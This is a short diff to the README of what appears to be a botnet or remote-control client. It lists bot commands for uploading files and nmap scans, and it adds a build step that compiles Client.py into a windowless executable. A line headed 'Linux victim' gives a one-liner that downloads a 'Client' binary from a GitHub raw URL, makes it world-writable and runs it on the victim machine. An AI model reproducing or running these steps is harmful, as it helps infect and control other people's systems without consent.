@@ -42,6 +42,9 @@ bnt: @udbnt
 * !upload.< HOSTNAME >@< IP > < PATH >           (Upload file to bot)
 * !nmap.< HOSTNAME >@< IP >                      (Nmap detailed subnet scan)
 
+# How to build
+pyinstaller --onefile --noconsole Client.py
+
 # Linux victim
 cd /boot; apt-get update -y; apt-get install curl -y; [ -f "Client" ] && rm Client; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; ./Client
 
